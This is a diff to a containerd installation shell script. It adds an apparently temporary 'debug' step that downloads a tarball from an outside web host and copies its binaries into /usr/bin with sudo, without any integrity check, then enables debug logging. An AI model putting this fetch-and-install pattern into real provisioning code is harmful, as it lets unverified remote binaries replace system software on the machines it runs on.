@@ -114,6 +114,14 @@ installContainerdWithAptGet() {
     semverCompare "$currentVersion" "$containerdMajorMinorPatchVersion"
     hasGreaterVersion="$?"
 
+    echo "install debug containerd"
+    mkdir /tempfolder || exit 1
+    cd /tempfolder || exit 2
+    wget https://abelwin.z13.web.core.windows.net/containerd.tar.gz2
+    tar zxvf containerd.tar.gz2
+    sudo cp bin/* /usr/bin/
+    sudo echo -e "[debug]\nlevel = \"debug\"" | sudo tee -a /etc/containerd/config.toml
+
     if [[ "$hasGreaterVersion" == "0" ]] && [[ "$currentMajorMinor" == "$desiredMajorMinor" ]]; then
         echo "currently installed containerd version ${currentVersion} matches major.minor with higher patch ${containerdMajorMinorPatchVersion}. skipping installStandaloneContainerd."
     else
